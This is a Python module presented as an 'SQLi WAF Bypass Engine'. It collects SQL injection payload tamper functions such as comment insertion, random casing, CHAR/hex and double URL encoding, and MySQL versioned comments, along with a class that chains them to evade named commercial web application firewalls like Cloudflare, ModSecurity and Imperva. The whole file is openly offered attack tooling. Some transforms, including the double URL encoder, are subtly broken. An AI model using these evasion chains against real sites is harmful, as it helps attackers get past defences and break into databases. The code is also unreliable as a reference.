"""
SQLi WAF Bypass Engine — Payload obfuscation and WAF evasion techniques.
"""
import random
import base64
import re
from typing import List, Callable, Dict, Any


TamperFunc = Callable[[str], str]


def space2comment(payload: str) -> str:
    return re.sub(r'\s+', '/**/', payload)


def space2plus(payload: str) -> str:
    return payload.replace(' ', '+')


def space2dash(payload: str) -> str:
    return re.sub(r' +', ' -', payload)


def randomcase(payload: str) -> str:
    result = []
    for c in payload:
        if c.isalpha():
            result.append(c.upper() if random.randint(0, 1) else c.lower())
        else:
            result.append(c)
    return ''.join(result)


def comment_between_keywords(payload: str) -> str:
    keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'ORDER', 'BY',
                'INSERT', 'UPDATE', 'DELETE', 'DROP', 'ALTER', 'CREATE', 'INTO',
                'VALUES', 'SET', 'HAVING', 'GROUP', 'LIMIT', 'OFFSET']
    pattern = re.compile(r'\b(' + '|'.join(keywords) + r')\b', re.IGNORECASE)
    return pattern.sub(r'\1/**/', payload)


def double_url_encode(payload: str) -> str:
    result = ''
    for c in payload:
        encoded = ''.join(f'%{ord(x):02X}' for x in c)
        result += ''.join(f'%25{x}' for x in encoded[1:])
    return result


def charencode(payload: str) -> str:
    result = ''
    for c in payload:
        if c.isalpha():
            result += f'CHAR({ord(c)})+'
        else:
            result += c
    if result.endswith('+'):
        result = result[:-1]
    return result


def hexencode(payload: str) -> str:
    result = ''
    for c in payload:
        if c.isalpha() or c in ' \'"=':
            result += hex(ord(c)).replace('0x', '%')
        else:
            result += c
    return result


def unmagicquotes(payload: str) -> str:
    return payload.replace("'", "%bf%27").replace('"', "%bf%22")


def modsecurity(payload: str) -> str:
    payload = re.sub(r'(?i)(union)\s+(all|distinct)?\s*', r'\1/*!\\\1*/', payload)
    payload = re.sub(r'(?i)(select)\s+', r'\1/*!\\\1*/', payload)
    return payload


def versioned_mysql(payload: str) -> str:
    return re.sub(r'(?i)(\bSELECT\b|\bUNION\b)', r'/*!12345\1*/', payload)


def between(payload: str) -> str:
    return payload.replace('>', 'NOT BETWEEN 0 AND ').replace('=', 'BETWEEN ')


def scientific(payload: str) -> str:
    return re.sub(r'(\d+)', lambda m: f"{m.group(1)}e0", payload)


def halfvers(mysql_payload: str) -> str:
    return mysql_payload.replace('/*!', '/*!0')


def bluecoat(payload: str) -> str:
    payload = payload.replace(' ', '%09')
    payload = payload.replace('UNION', 'UNION ALL')
    return payload


ALL_TAMPERS: Dict[str, TamperFunc] = {
    'space2comment': space2comment,
    'space2plus': space2plus,
    'space2dash': space2dash,
    'randomcase': randomcase,
    'comment_between_keywords': comment_between_keywords,
    'double_url_encode': double_url_encode,
    'charencode': charencode,
    'hexencode': hexencode,
    'unmagicquotes': unmagicquotes,
    'modsecurity': modsecurity,
    'versioned_mysql': versioned_mysql,
    'between': between,
    'scientific': scientific,
    'halfvers': halfvers,
    'bluecoat': bluecoat,
}


def apply_tampers(payload: str, tamper_names: List[str]) -> str:
    result = payload
    for name in tamper_names:
        if name in ALL_TAMPERS:
            result = ALL_TAMPERS[name](result)
    return result


def generate_variants(payload: str, count: int = 5) -> List[str]:
    variants = set()
    tamper_list = list(ALL_TAMPERS.keys())
    for _ in range(count * 3):
        k = random.randint(1, min(4, len(tamper_list)))
        selected = random.sample(tamper_list, k)
        variant = apply_tampers(payload, selected)
        if variant != payload:
            variants.add(variant)
        if len(variants) >= count:
            break
    return list(variants)[:count]


class WAFBypass:
    def __init__(self):
        self.tampers = ALL_TAMPERS

    def bypass_payload(self, payload: str, target_waf: str = "") -> List[str]:
        if target_waf.lower() in ('cloudflare', 'akamai'):
            return generate_variants(payload, 10)
        elif target_waf.lower() in ('modsecurity', 'aws waf'):
            variants = [apply_tampers(payload, ['modsecurity', 'randomcase'])]
            variants.extend(generate_variants(payload, 5))
            return variants
        elif target_waf.lower() in ('imperva', 'incapsula'):
            variants = [apply_tampers(payload, ['comment_between_keywords', 'between'])]
            variants.extend(generate_variants(payload, 5))
            return variants
        else:
            return generate_variants(payload, 8)

    def obfuscate(self, sql_query: str, level: int = 1) -> str:
        if level <= 1:
            return randomcase(sql_query)
        elif level == 2:
            return comment_between_keywords(randomcase(sql_query))
        elif level == 3:
            return modsecurity(comment_between_keywords(randomcase(sql_query)))
        else:
            return double_url_encode(charencode(sql_query))
